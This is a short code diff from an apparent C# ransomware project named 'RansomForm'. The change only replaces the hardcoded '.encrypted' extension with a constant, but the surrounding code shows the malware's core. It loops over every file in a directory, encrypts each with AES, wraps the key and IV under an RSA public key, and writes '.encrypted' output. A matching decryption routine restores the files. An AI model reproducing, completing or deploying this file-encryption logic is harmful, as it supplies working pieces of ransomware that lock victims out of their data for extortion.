@@ -48,7 +48,7 @@ namespace RansomForm
       RSA.ImportRSAPublicKey(rsapublickey, out bytesRead);
       foreach (string f in Directory.GetFiles(path))
       {
-        if (!f.Contains(".encrypted"))
+        if (!f.Contains(ENCRYPTED_FILE_EXTENSION))
         {
           Console.Out.WriteLine("Encrypting: " + f);
           encryptFile(f, RSA);
@@ -82,7 +82,7 @@ namespace RansomForm
             encryptedAesKey = RSA.Encrypt(keyvalue, false); // size 256
             encryptedIv = RSA.Encrypt(iv, false); // size 256
 
-            using (FileStream output = new(path + ".encrypted", FileMode.Create))
+            using (FileStream output = new(path + ENCRYPTED_FILE_EXTENSION, FileMode.Create))
             {
               output.Write(encryptedAesKey, 0, encryptedAesKey.Length);
               output.Write(encryptedIv, 0, encryptedIv.Length);
@@ -145,7 +145,7 @@ namespace RansomForm
 
       foreach (string f in Directory.GetFiles(path))
       {
-        if (f.Contains(".encrypted"))
+        if (f.Contains(ENCRYPTED_FILE_EXTENSION))
         {
           Console.Out.WriteLine("Decrypting: " + f);
           decryptFile(f, RSA);
@@ -181,7 +181,7 @@ namespace RansomForm
             aes.IV = decryptedIv;
             aes.Padding = PaddingMode.PKCS7;
 
-            string newpath = path.Replace(".encrypted", "");
+            string newpath = path.Replace(ENCRYPTED_FILE_EXTENSION, "");
 
             using (FileStream output = new(newpath, FileMode.Create))
             {
